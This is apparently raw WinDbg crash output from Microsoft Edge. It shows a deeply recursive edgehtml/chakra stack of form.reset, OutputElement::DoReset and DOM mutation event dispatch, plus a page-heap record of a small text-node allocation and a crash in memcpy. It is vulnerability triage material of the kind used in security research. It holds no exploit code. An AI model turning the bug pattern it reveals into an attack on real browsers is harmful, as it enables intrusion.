71        60 00000002`9d82ace0 00007ffd`62586872 : 00000147`26da3b40 00000002`9d82ae28 00000147`28474890 00000002`9d82b200 : chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
72        f0 00000002`9d82add0 00007ffd`625867b5 : 00000147`26da3b40 00000002`9d82ae90 00000147`28474890 00007ffd`62c34c00 : chakra!Js::JavascriptFunction::CallRootFunction+0x7e
73        80 00000002`9d82ae50 00007ffd`62443d1b : 00000147`26da3b40 00000002`9d82aee0 00000000`00000000 00000002`9d82aef0 : chakra!ScriptSite::CallRootFunction+0x6d
74        60 00000002`9d82aeb0 00007ffd`62446d66 : 00000147`28472f00 00000147`26da3b40 00000002`9d82af80 00000000`00000000 : chakra!ScriptSite::Execute+0x12b
75        90 00000002`9d82af40 00007ffd`62e40ae1 : 00000147`2846ec10 00000147`26da3b40 00000147`00000002 00000002`9d82b108 : chakra!ScriptEngineBase::Execute+0xb6
76        a0 00000002`9d82afe0 00007ffd`62e40a08 : 0000000d`3fadb190 00000000`000000d2 4588e251`00000000 49cd8a74`6d9d37ae : edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
77        50 00000002`9d82b030 00007ffd`62ee00a8 : 0000014f`683eccb0 00000002`9d82b141 0000014f`613867d8 0000014f`680e5100 : edgehtml!CJScript9Holder::ExecuteCallback+0x50
78        40 00000002`9d82b070 00007ffd`62edfdd5 : 0000014f`613867d8 00000147`26da3b40 00000147`082fc540 0000014f`613867d0 : edgehtml!CListenerDispatch::InvokeVar+0x258
79       120 00000002`9d82b190 00007ffd`62edfa07 : 0000014f`613867d8 00000147`082fc540 0000014f`613867d0 00000002`9d82b460 : edgehtml!CListenerDispatch::Invoke+0xbd
7a        90 00000002`9d82b220 00007ffd`62d28d07 : 00000147`082fc540 0000014f`4ed6b410 00000002`9d82b460 00007ffd`63030700 : edgehtml!CEventMgr::_InvokeListeners+0x307
7b       160 00000002`9d82b380 00007ffd`62e7707f : 00000147`082fc540 00000002`9d82b460 00000147`082fc540 00000002`9d82b4c0 : edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
7c        40 00000002`9d82b3c0 00007ffd`62c2df50 : 00000147`082fc540 0000014f`4ed9d5f0 00000000`00000000 00000000`ffffffff : edgehtml!CEventMgr::Dispatch+0x5ef
7d       310 00000002`9d82b6d0 00007ffd`62d0ce3b : 00007ffd`63b8c1c0 0000014f`4ed9d5f0 0000014f`68405a00 0000014f`4ed6b410 : edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
7e        50 00000002`9d82b720 00007ffd`62ee76a5 : 00000147`00000eb3 0000014f`4ed6b410 0000014f`4ed9d5f0 0000014f`68106600 : edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
7f       170 00000002`9d82b890 00007ffd`62f8e126 : 00000000`00000101 00000002`9d82b979 0000014f`68106600 0000014f`68405a00 : edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
80        30 00000002`9d82b8c0 00007ffd`62c34c13 : 0000014f`67f6b6c0 00000002`9d82ba40 0000014f`4ed6b520 0000014f`4ed6b410 : edgehtml!Tree::TreeWriter::RemoveNode+0x126
81       120 00000002`9d82b9e0 00007ffd`638bb76e : 00000000`00000001 00000002`9d82baf9 00000147`2846ec10 00007ffd`62e442c6 : edgehtml!Tree::ElementNode::SetTextContent+0x1f
82        50 00000002`9d82ba30 00007ffd`638c0bbf : 00000002`9d82baa8 0000014f`4ed6b410 00000000`00000000 00000002`9d82ba90 : edgehtml!OutputElement::DoReset+0x3e
83        40 00000002`9d82ba70 00007ffd`634517f2 : 00000000`10000001 00000000`10000001 00000147`2846ec10 0000014f`68725919 : edgehtml!CFormElement::DoReset+0x137
84        f0 00000002`9d82bb60 00007ffd`6309fd55 : 00000147`4de8e760 0000014f`67f87950 00000002`9d82bbf0 0000014f`4ed6b520 : edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
85        60 00000002`9d82bbc0 00007ffd`6256c191 : 0000014f`67f87950 00000000`10000001 00000002`9d82bcd0 00000147`083bbb80 : edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
86        30 00000002`9d82bbf0 0000014f`68725919 : 0000014f`67f87950 00000000`10000001 00000147`083abd80 00000002`9d82bbe0 : chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
87        d0 00000002`9d82bcc0 00007ffd`625a8bc6 : 00000147`26da3b40 00000000`00000002 00000147`083abea0 00000147`26d60f00 : 0x0000014f`68725919
88        80 00000002`9d82bd40 00007ffd`62484c7c : 00000147`4de8e760 00000000`00000010 00000000`00000000 ffffffff`fffffffe : chakra!amd64_CallFunction+0x86
89        50 00000002`9d82bd90 00007ffd`62586999 : 00000147`26da3b40 0000014f`786003c0 00000002`9d82be30 00000147`28474890 : chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
8a        60 00000002`9d82bdf0 00007ffd`62586872 : 00000147`26da3b40 00000002`9d82bf38 00000147`28474890 00000002`9d82c300 : chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
8b        f0 00000002`9d82bee0 00007ffd`625867b5 : 00000147`26da3b40 00000002`9d82bfa0 00000147`28474890 00007ffd`62c34c00 : chakra!Js::JavascriptFunction::CallRootFunction+0x7e
8c        80 00000002`9d82bf60 00007ffd`62443d1b : 00000147`26da3b40 00000002`9d82bff0 00000000`00000000 00000002`9d82c000 : chakra!ScriptSite::CallRootFunction+0x6d
8d        60 00000002`9d82bfc0 00007ffd`62446d66 : 00000147`28472f00 00000147`26da3b40 00000002`9d82c090 00000000`00000000 : chakra!ScriptSite::Execute+0x12b
8e        90 00000002`9d82c050 00007ffd`62e40ae1 : 00000147`2846ec10 00000147`26da3b40 00000147`00000002 00000002`9d82c218 : chakra!ScriptEngineBase::Execute+0xb6
8f        a0 00000002`9d82c0f0 00007ffd`62e40a08 : 0000000d`3fadb07c 00000000`000000d2 4588e251`00000000 49cd8a74`6d9d37ae : edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
90        50 00000002`9d82c140 00007ffd`62ee00a8 : 0000014f`683eccb0 00000002`9d82c251 0000014f`613867d8 0000014f`680e5100 : edgehtml!CJScript9Holder::ExecuteCallback+0x50
91        40 00000002`9d82c180 00007ffd`62edfdd5 : 0000014f`613867d8 00000147`26da3b40 00000147`082fc460 0000014f`613867d0 : edgehtml!CListenerDispatch::InvokeVar+0x258
92       120 00000002`9d82c2a0 00007ffd`62edfa07 : 0000014f`613867d8 00000147`082fc460 0000014f`613867d0 00000002`9d82c570 : edgehtml!CListenerDispatch::Invoke+0xbd
93        90 00000002`9d82c330 00007ffd`62d28d07 : 00000147`082fc460 0000014f`4ed6b410 00000002`9d82c570 00007ffd`63030700 : edgehtml!CEventMgr::_InvokeListeners+0x307
94       160 00000002`9d82c490 00007ffd`62e7707f : 00000147`082fc460 00000002`9d82c570 00000147`082fc460 00000002`9d82c5d0 : edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
95        40 00000002`9d82c4d0 00007ffd`62c2df50 : 00000147`082fc460 0000014f`4ed9d5f0 00000000`00000000 00000000`ffffffff : edgehtml!CEventMgr::Dispatch+0x5ef
96       310 00000002`9d82c7e0 00007ffd`62d0ce3b : 00007ffd`63b8c1c0 0000014f`4ed9d5f0 0000014f`68405a00 0000014f`4ed6b410 : edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
97        50 00000002`9d82c830 00007ffd`62ee76a5 : 00000147`00000eb3 0000014f`4ed6b410 0000014f`4ed9d5f0 0000014f`68106600 : edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
98       170 00000002`9d82c9a0 00007ffd`62f8e126 : 00000000`00000101 00000002`9d82ca89 0000014f`68106600 0000014f`68405a00 : edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
99        30 00000002`9d82c9d0 00007ffd`62c34c13 : 0000014f`67f6b6c0 00000002`9d82cb50 0000014f`4ed6b520 0000014f`4ed6b410 : edgehtml!Tree::TreeWriter::RemoveNode+0x126
9a       120 00000002`9d82caf0 00007ffd`638bb76e : 00000000`00000001 00000002`9d82cc09 00000147`2846ec10 00007ffd`62e442c6 : edgehtml!Tree::ElementNode::SetTextContent+0x1f
9b        50 00000002`9d82cb40 00007ffd`638c0bbf : 00000002`9d82cbb8 0000014f`4ed6b410 00000000`00000000 00000002`9d82cba0 : edgehtml!OutputElement::DoReset+0x3e
9c        40 00000002`9d82cb80 00007ffd`634517f2 : 00000000`10000001 00000000`10000001 00000147`2846ec10 0000014f`68725919 : edgehtml!CFormElement::DoReset+0x137
9d        f0 00000002`9d82cc70 00007ffd`6309fd55 : 00000147`4de8e760 0000014f`67f87950 00000002`9d82cd00 0000014f`4ed6b520 : edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
9e        60 00000002`9d82ccd0 00007ffd`6256c191 : 0000014f`67f87950 00000000`10000001 00000002`9d82cde0 00000147`083bbb80 : edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
9f        30 00000002`9d82cd00 0000014f`68725919 : 0000014f`67f87950 00000000`10000001 00000147`083abd80 00000002`9d82ccf0 : chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
a0        d0 00000002`9d82cdd0 00007ffd`625a8bc6 : 00000147`26da3b40 00000000`00000002 00000147`083abea0 00000147`26d60e80 : 0x0000014f`68725919
a1        80 00000002`9d82ce50 00007ffd`62484c7c : 00000147`4de8e760 00000000`00000010 00000000`00000000 ffffffff`fffffffe : chakra!amd64_CallFunction+0x86
a2        50 00000002`9d82cea0 00007ffd`62586999 : 00000147`26da3b40 0000014f`786003c0 00000002`9d82cf40 00000147`28474890 : chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
a3        60 00000002`9d82cf00 00007ffd`62586872 : 00000147`26da3b40 00000002`9d82d048 00000147`28474890 00000002`9d82d400 : chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
a4        f0 00000002`9d82cff0 00007ffd`625867b5 : 00000147`26da3b40 00000002`9d82d0b0 00000147`28474890 00007ffd`62c34c00 : chakra!Js::JavascriptFunction::CallRootFunction+0x7e
a5        80 00000002`9d82d070 00007ffd`62443d1b : 00000147`26da3b40 00000002`9d82d100 00000000`00000000 00000002`9d82d110 : chakra!ScriptSite::CallRootFunction+0x6d
a6        60 00000002`9d82d0d0 00007ffd`62446d66 : 00000147`28472f00 00000147`26da3b40 00000002`9d82d1a0 00000000`00000000 : chakra!ScriptSite::Execute+0x12b
a7        90 00000002`9d82d160 00007ffd`62e40ae1 : 00000147`2846ec10 00000147`26da3b40 00000147`00000002 00000002`9d82d328 : chakra!ScriptEngineBase::Execute+0xb6
a8        a0 00000002`9d82d200 00007ffd`62e40a08 : 0000000d`3fadaf68 00000000`000000d2 4588e251`00000000 49cd8a74`6d9d37ae : edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
a9        50 00000002`9d82d250 00007ffd`62ee00a8 : 0000014f`683eccb0 00000002`9d82d361 0000014f`613867d8 0000014f`680e5100 : edgehtml!CJScript9Holder::ExecuteCallback+0x50
aa        40 00000002`9d82d290 00007ffd`62edfdd5 : 0000014f`613867d8 00000147`26da3b40 00000147`082fc380 0000014f`613867d0 : edgehtml!CListenerDispatch::InvokeVar+0x258
ab       120 00000002`9d82d3b0 00007ffd`62edfa07 : 0000014f`613867d8 00000147`082fc380 0000014f`613867d0 00000002`9d82d680 : edgehtml!CListenerDispatch::Invoke+0xbd
ac        90 00000002`9d82d440 00007ffd`62d28d07 : 00000147`082fc380 0000014f`4ed6b410 00000002`9d82d680 00007ffd`63030700 : edgehtml!CEventMgr::_InvokeListeners+0x307
ad       160 00000002`9d82d5a0 00007ffd`62e7707f : 00000147`082fc380 00000002`9d82d680 00000147`082fc380 00000002`9d82d6e0 : edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
ae        40 00000002`9d82d5e0 00007ffd`62c2df50 : 00000147`082fc380 0000014f`4ed9d5f0 00000000`00000000 00000000`ffffffff : edgehtml!CEventMgr::Dispatch+0x5ef
af       310 00000002`9d82d8f0 00007ffd`62d0ce3b : 00007ffd`63b8c1c0 0000014f`4ed9d5f0 0000014f`68405a00 0000014f`4ed6b410 : edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
b0        50 00000002`9d82d940 00007ffd`62ee76a5 : 00000147`00000eb3 0000014f`4ed6b410 0000014f`4ed9d5f0 0000014f`68106600 : edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
b1       170 00000002`9d82dab0 00007ffd`62f8e126 : 00000000`00000101 00000002`9d82db99 0000014f`68106600 0000014f`68405a00 : edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
b2        30 00000002`9d82dae0 00007ffd`62c34c13 : 0000014f`67f6b6c0 00000002`9d82dc60 0000014f`4ed6b520 0000014f`4ed6b410 : edgehtml!Tree::TreeWriter::RemoveNode+0x126
b3       120 00000002`9d82dc00 00007ffd`638bb76e : 00000000`00000001 00000002`9d82dd19 00000147`2846ec10 00007ffd`62e442c6 : edgehtml!Tree::ElementNode::SetTextContent+0x1f
b4        50 00000002`9d82dc50 00007ffd`638c0bbf : 00000002`9d82dcc8 0000014f`4ed6b410 00000000`00000000 00000002`9d82dcb0 : edgehtml!OutputElement::DoReset+0x3e
b5        40 00000002`9d82dc90 00007ffd`634517f2 : 00000000`10000001 00000000`10000001 00000147`2846ec10 0000014f`68725919 : edgehtml!CFormElement::DoReset+0x137
b6        f0 00000002`9d82dd80 00007ffd`6309fd55 : 00000147`4de8e760 0000014f`67f87950 00000002`9d82de10 0000014f`4ed6b520 : edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
b7        60 00000002`9d82dde0 00007ffd`6256c191 : 0000014f`67f87950 00000000`10000001 00000002`9d82def0 00000147`083bbb80 : edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
b8        30 00000002`9d82de10 0000014f`68725919 : 0000014f`67f87950 00000000`10000001 00000147`083abd80 00000002`9d82de00 : chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
b9        d0 00000002`9d82dee0 00007ffd`625a8bc6 : 00000147`26da3b40 00000000`00000002 00000147`083abea0 00000147`26d60e00 : 0x0000014f`68725919
ba        80 00000002`9d82df60 00007ffd`62484c7c : 00000147`4de8e760 00000000`00000010 00000000`00000000 ffffffff`fffffffe : chakra!amd64_CallFunction+0x86
bb        50 00000002`9d82dfb0 00007ffd`62586999 : 00000147`26da3b40 0000014f`786003c0 00000002`9d82e050 00000147`28474890 : chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
bc        60 00000002`9d82e010 00007ffd`62586872 : 00000147`26da3b40 00000002`9d82e158 00000147`28474890 00000002`9d82e500 : chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
bd        f0 00000002`9d82e100 00007ffd`625867b5 : 00000147`26da3b40 00000002`9d82e1c0 00000147`28474890 00007ffd`62c34c00 : chakra!Js::JavascriptFunction::CallRootFunction+0x7e
be        80 00000002`9d82e180 00007ffd`62443d1b : 00000147`26da3b40 00000002`9d82e210 00000000`00000000 00000002`9d82e220 : chakra!ScriptSite::CallRootFunction+0x6d
bf        60 00000002`9d82e1e0 00007ffd`62446d66 : 00000147`28472f00 00000147`26da3b40 00000002`9d82e2b0 00000000`00000000 : chakra!ScriptSite::Execute+0x12b
c0        90 00000002`9d82e270 00007ffd`62e40ae1 : 00000147`2846ec10 00000147`26da3b40 00000147`00000002 00000002`9d82e438 : chakra!ScriptEngineBase::Execute+0xb6
c1        a0 00000002`9d82e310 00007ffd`62e40a08 : 0000000d`3fadae48 00000000`000000d2 4588e251`00000000 49cd8a74`6d9d37ae : edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
c2        50 00000002`9d82e360 00007ffd`62ee00a8 : 0000014f`683eccb0 00000002`9d82e471 0000014f`613867d8 0000014f`680e5100 : edgehtml!CJScript9Holder::ExecuteCallback+0x50
c3        40 00000002`9d82e3a0 00007ffd`62edfdd5 : 0000014f`613867d8 00000147`26da3b40 00000147`082fc2a0 0000014f`613867d0 : edgehtml!CListenerDispatch::InvokeVar+0x258
c4       120 00000002`9d82e4c0 00007ffd`62edfa07 : 0000014f`613867d8 00000147`082fc2a0 0000014f`613867d0 00000002`9d82e790 : edgehtml!CListenerDispatch::Invoke+0xbd
c5        90 00000002`9d82e550 00007ffd`62d28d07 : 00000147`082fc2a0 0000014f`4ed6b410 00000002`9d82e790 00007ffd`63030700 : edgehtml!CEventMgr::_InvokeListeners+0x307
c6       160 00000002`9d82e6b0 00007ffd`62e7707f : 00000147`082fc2a0 00000002`9d82e790 00000147`082fc2a0 00000002`9d82e7f0 : edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
c7        40 00000002`9d82e6f0 00007ffd`62c2df50 : 00000147`082fc2a0 0000014f`4ed9d5f0 00000000`00000000 00000000`ffffffff : edgehtml!CEventMgr::Dispatch+0x5ef
c8       310 00000002`9d82ea00 00007ffd`62d0ce3b : 00007ffd`63b8c1c0 0000014f`4ed9d5f0 0000014f`68405a00 0000014f`4ed6b410 : edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
c9        50 00000002`9d82ea50 00007ffd`62ee76a5 : 00000147`00000eb3 0000014f`4ed6b410 0000014f`4ed9d5f0 0000014f`68106600 : edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
ca       170 00000002`9d82ebc0 00007ffd`62f8e126 : 00000000`00000101 00000002`9d82eca9 0000014f`68106600 0000014f`68405a00 : edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
cb        30 00000002`9d82ebf0 00007ffd`62c34c13 : 0000014f`67f6b6c0 00000002`9d82ed70 0000014f`4ed6b520 0000014f`4ed6b410 : edgehtml!Tree::TreeWriter::RemoveNode+0x126
cc       120 00000002`9d82ed10 00007ffd`638bb76e : 00000000`00000001 00000002`9d82ee29 00000147`2846ec10 00007ffd`62e442c6 : edgehtml!Tree::ElementNode::SetTextContent+0x1f
cd        50 00000002`9d82ed60 00007ffd`638c0bbf : 00000002`9d82edd8 0000014f`4ed6b410 00000000`00000000 00000002`9d82edc0 : edgehtml!OutputElement::DoReset+0x3e
ce        40 00000002`9d82eda0 00007ffd`634517f2 : 00000000`10000001 00000000`10000001 00000147`2846ec10 0000014f`68725919 : edgehtml!CFormElement::DoReset+0x137
cf        f0 00000002`9d82ee90 00007ffd`6309fd55 : 00000147`4de8e760 0000014f`67f87950 00000002`9d82ef20 0000014f`4ed6b520 : edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
d0        60 00000002`9d82eef0 00007ffd`6256c191 : 0000014f`67f87950 00000000`10000001 00000002`9d82f000 00000147`083bbb80 : edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
d1        30 00000002`9d82ef20 0000014f`68725919 : 0000014f`67f87950 00000000`10000001 00000147`083abd80 00000002`9d82ef10 : chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
d2        d0 00000002`9d82eff0 00007ffd`625a8bc6 : 00000147`26da3b40 00000000`00000002 00000147`083abea0 00000147`26d60d80 : 0x0000014f`68725919
d3        80 00000002`9d82f070 00007ffd`62484c7c : 00000147`4de8e760 00000000`00000010 00000000`00000000 ffffffff`fffffffe : chakra!amd64_CallFunction+0x86
d4        50 00000002`9d82f0c0 00007ffd`62586999 : 00000147`26da3b40 0000014f`786003c0 00000002`9d82f160 00000147`28474890 : chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
d5        60 00000002`9d82f120 00007ffd`62586872 : 00000147`26da3b40 00000002`9d82f268 00000147`28474890 00000002`9d82f600 : chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
d6        f0 00000002`9d82f210 00007ffd`625867b5 : 00000147`26da3b40 00000002`9d82f2d0 00000147`28474890 00007ffd`62c34c00 : chakra!Js::JavascriptFunction::CallRootFunction+0x7e
d7        80 00000002`9d82f290 00007ffd`62443d1b : 00000147`26da3b40 00000002`9d82f320 00000000`00000000 00000002`9d82f330 : chakra!ScriptSite::CallRootFunction+0x6d
d8        60 00000002`9d82f2f0 00007ffd`62446d66 : 00000147`28472f00 00000147`26da3b40 00000002`9d82f3c0 00000000`00000000 : chakra!ScriptSite::Execute+0x12b
d9        90 00000002`9d82f380 00007ffd`62e40ae1 : 00000147`2846ec10 00000147`26da3b40 00000147`00000002 00000002`9d82f548 : chakra!ScriptEngineBase::Execute+0xb6
da        a0 00000002`9d82f420 00007ffd`62e40a08 : 0000000d`3fadad38 00000000`000000d2 4588e251`00000000 49cd8a74`6d9d37ae : edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
db        50 00000002`9d82f470 00007ffd`62ee00a8 : 0000014f`683eccb0 00000002`9d82f581 0000014f`613867d8 0000014f`680e5100 : edgehtml!CJScript9Holder::ExecuteCallback+0x50
dc        40 00000002`9d82f4b0 00007ffd`62edfdd5 : 0000014f`613867d8 00000147`26da3b40 00000147`082fc1c0 0000014f`613867d0 : edgehtml!CListenerDispatch::InvokeVar+0x258
dd       120 00000002`9d82f5d0 00007ffd`62edfa07 : 0000014f`613867d8 00000147`082fc1c0 0000014f`613867d0 00000002`9d82f8a0 : edgehtml!CListenerDispatch::Invoke+0xbd
de        90 00000002`9d82f660 00007ffd`62d28d07 : 00000147`082fc1c0 0000014f`4ed6b410 00000002`9d82f8a0 00007ffd`63030700 : edgehtml!CEventMgr::_InvokeListeners+0x307
df       160 00000002`9d82f7c0 00007ffd`62e7707f : 00000147`082fc1c0 00000002`9d82f8a0 00000147`082fc1c0 00000002`9d82f900 : edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
e0        40 00000002`9d82f800 00007ffd`62c2df50 : 00000147`082fc1c0 0000014f`4ed9d5f0 00000000`00000000 00000000`ffffffff : edgehtml!CEventMgr::Dispatch+0x5ef
e1       310 00000002`9d82fb10 00007ffd`62d0ce3b : 00007ffd`63b8c1c0 0000014f`4ed9d5f0 0000014f`68405a00 0000014f`4ed6b410 : edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
e2        50 00000002`9d82fb60 00007ffd`62ee76a5 : 00000147`00000eb3 0000014f`4ed6b410 0000014f`4ed9d5f0 0000014f`68106600 : edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
e3       170 00000002`9d82fcd0 00007ffd`62f8e126 : 00000000`00000101 00000002`9d82fdb9 0000014f`68106600 0000014f`68405a00 : edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
e4        30 00000002`9d82fd00 00007ffd`62c34c13 : 0000014f`67f6b6c0 00000002`9d82fe80 0000014f`4ed6b520 0000014f`4ed6b410 : edgehtml!Tree::TreeWriter::RemoveNode+0x126
e5       120 00000002`9d82fe20 00007ffd`638bb76e : 00000000`00000001 00000002`9d82ff39 00000147`2846ec10 00007ffd`62e442c6 : edgehtml!Tree::ElementNode::SetTextContent+0x1f
e6        50 00000002`9d82fe70 00007ffd`638c0bbf : 00000002`9d82fee8 0000014f`4ed6b410 00000000`00000000 00000002`9d82fed0 : edgehtml!OutputElement::DoReset+0x3e
e7        40 00000002`9d82feb0 00007ffd`634517f2 : 00000000`10000001 00000000`10000001 00000147`2846ec10 0000014f`68725919 : edgehtml!CFormElement::DoReset+0x137
e8        f0 00000002`9d82ffa0 00007ffd`6309fd55 : 00000147`4de8e760 0000014f`67f87950 00000002`9d830030 0000014f`4ed6b520 : edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
e9        60 00000002`9d830000 00007ffd`6256c191 : 0000014f`67f87950 00000000`10000001 00000002`9d830110 00000147`083bbb80 : edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
ea        30 00000002`9d830030 0000014f`68725919 : 0000014f`67f87950 00000000`10000001 00000147`083abd80 00000002`9d830020 : chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
eb        d0 00000002`9d830100 00007ffd`625a8bc6 : 00000147`26da3b40 00000000`00000002 00000147`083abea0 00000147`26d60d00 : 0x0000014f`68725919
ec        80 00000002`9d830180 00007ffd`62484c7c : 00000147`4de8e760 00000000`00000010 00000000`00000000 ffffffff`fffffffe : chakra!amd64_CallFunction+0x86
ed        50 00000002`9d8301d0 00007ffd`62586999 : 00000147`26da3b40 0000014f`786003c0 00000002`9d830270 00000147`28474890 : chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
ee        60 00000002`9d830230 00007ffd`62586872 : 00000147`26da3b40 00000002`9d830378 00000147`28474890 00000002`9d830700 : chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
ef        f0 00000002`9d830320 00007ffd`625867b5 : 00000147`26da3b40 00000002`9d8303e0 00000147`28474890 00007ffd`8916d600 : chakra!Js::JavascriptFunction::CallRootFunction+0x7e
f0        80 00000002`9d8303a0 00007ffd`62443d1b : 00000147`26da3b40 00000002`9d830430 00000000`00000000 00000002`9d830440 : chakra!ScriptSite::CallRootFunction+0x6d
f1        60 00000002`9d830400 00007ffd`62446d66 : 00000147`28472f00 00000147`26da3b40 00000002`9d8304d0 00000000`00000000 : chakra!ScriptSite::Execute+0x12b
f2        90 00000002`9d830490 00007ffd`62e40ae1 : 00000147`2846ec10 00000147`26da3b40 00000147`00000002 00000002`9d830658 : chakra!ScriptEngineBase::Execute+0xb6
f3        a0 00000002`9d830530 00007ffd`62e40a08 : 0000000d`3fadac29 00000000`000000d2 4588e251`00000000 49cd8a74`6d9d37ae : edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
f4        50 00000002`9d830580 00007ffd`62ee00a8 : 0000014f`683eccb0 00000002`9d830691 0000014f`613867d8 0000014f`680e5100 : edgehtml!CJScript9Holder::ExecuteCallback+0x50
f5        40 00000002`9d8305c0 00007ffd`62edfdd5 : 0000014f`613867d8 00000147`26da3b40 00000147`082fc0e0 0000014f`613867d0 : edgehtml!CListenerDispatch::InvokeVar+0x258
f6       120 00000002`9d8306e0 00007ffd`62edfa07 : 0000014f`613867d8 00000147`082fc0e0 0000014f`613867d0 00000002`9d8309b0 : edgehtml!CListenerDispatch::Invoke+0xbd
f7        90 00000002`9d830770 00007ffd`62d28d07 : 00000147`082fc0e0 0000014f`4ed6b410 00000002`9d8309b0 00007ffd`63030700 : edgehtml!CEventMgr::_InvokeListeners+0x307
f8       160 00000002`9d8308d0 00007ffd`62e7707f : 00000147`082fc0e0 00000002`9d8309b0 00000147`082fc0e0 00000002`9d830a10 : edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
f9        40 00000002`9d830910 00007ffd`62c2df50 : 00000147`082fc0e0 0000014f`4ed9d5f0 00000000`00000000 00000000`ffffffff : edgehtml!CEventMgr::Dispatch+0x5ef
fa       310 00000002`9d830c20 00007ffd`62d0ce3b : 00007ffd`63b8c1c0 0000014f`4ed9d5f0 0000014f`68405a00 0000014f`4ed6b410 : edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
fb        50 00000002`9d830c70 00007ffd`62ee76a5 : 00000147`00000eb3 0000014f`4ed6b410 0000014f`4ed9d5f0 0000014f`68106600 : edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
fc       170 00000002`9d830de0 00007ffd`62f8e126 : 00000000`00000101 00000002`9d830ec9 0000014f`68106600 0000014f`68405a00 : edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
fd        30 00000002`9d830e10 00007ffd`62c34c13 : 0000014f`67f6b6c0 00000002`9d830f90 0000014f`4ed6b520 0000014f`4ed6b410 : edgehtml!Tree::TreeWriter::RemoveNode+0x126
fe       120 00000002`9d830f30 00007ffd`638bb76e : 00000000`00000001 00000002`9d831049 00000147`2846ec10 00007ffd`62e442c6 : edgehtml!Tree::ElementNode::SetTextContent+0x1f
ff        50 00000002`9d830f80 00007ffd`638c0bbf : 00000002`9d830ff8 0000014f`4ed6b410 00000000`00000000 00000002`9d830fe0 : edgehtml!OutputElement::DoReset+0x3e
0:019> !heap -p -a @rcx
    address 000001474c7dbff2 found in
    _DPH_HEAP_ROOT @ 14747b61000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                             14747bbb208:      1474c7dbfe0               12 -      1474c7db000             2000
    00007ffd8920345f ntdll!RtlDebugAllocateHeap+0x000000000000003f
    00007ffd891b50d4 ntdll!RtlpAllocateHeap+0x0000000000089f54
    00007ffd89128e0b ntdll!RtlpAllocateHeapInternal+0x00000000000005cb
    00007ffd62fff066 edgehtml!Tree::TextData::Create+0x000000000000002a
    00007ffd62e4b5a2 edgehtml!Tree::TextData::Create+0x0000000000000042
    00007ffd62f0d87d edgehtml!Tree::TreeWriter::NewTextNode+0x000000000000003d
    00007ffd62c34c68 edgehtml!Tree::ElementNode::SetTextContent+0x0000000000000074
    00007ffd638bb76e edgehtml!OutputElement::DoReset+0x000000000000003e
    00007ffd638c0bbf edgehtml!CFormElement::DoReset+0x0000000000000137
    00007ffd634517f2 edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x0000000000000072
    00007ffd6309fd55 edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x0000000000000025
    00007ffd6256c191 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x00000000000001d1
    0000014f68725919 +0x0000014f68725919

 
0:019> kn
 # Child-SP          RetAddr           Call Site
00 00000002`9d8263b8 00007ffd`86fbb940 msvcrt!memcpy+0x1c0
